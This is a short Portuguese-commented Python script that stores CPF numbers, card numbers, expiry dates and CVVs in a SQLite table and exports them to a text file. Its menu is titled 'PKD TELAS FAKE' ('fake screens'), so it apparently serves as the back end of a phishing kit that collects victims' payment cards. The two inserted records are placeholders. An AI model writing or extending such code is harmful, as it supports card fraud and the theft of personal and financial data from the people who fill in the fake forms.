import sqlite3

# Conecta ao banco de dados
conn = sqlite3.connect('formulario.db')

# Cria a tabela Formulario se ela não existir
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS Formulario
             (cpf TEXT, cartao TEXT, validade TEXT, cvv TEXT)''')
conn.commit()

# Função para inserir os dados do formulário na tabela
def inserir_formulario(cpf, cartao, validade, cvv):
    c.execute("INSERT INTO Formulario VALUES (?, ?, ?, ?)", (cpf, cartao, validade, cvv))
    conn.commit()

# Função para ler os dados do formulário na tabela
def ler_formulario():
    c.execute("SELECT * FROM Formulario")
    return c.fetchall()

# Função para salvar os dados do formulário em um arquivo .txt
def salvar_arquivo():
    with open('Info.txt', 'w') as f:
        f.write("CPF\tCARTÃO\tVALIDADE\tCVV\n")
        for row in ler_formulario():
            f.write('\t'.join(row) + '\n')

# Função principal para exibir o menu
def main():
    print("PKD TELAS FAKE\n")
    print("1. Lista de Infos\n")

    opcao = input("Escolha uma opção: ")
    if opcao == "1":
        salvar_arquivo()
    else:
        print("Opção inválida.")

# Exemplo de uso
inserir_formulario("123.456.789-00", "1234 5678 9012 3456", "12/24", "123")
inserir_formulario("987.654.321-00", "5678 9012 3456 7890", "03/25", "456")
main()
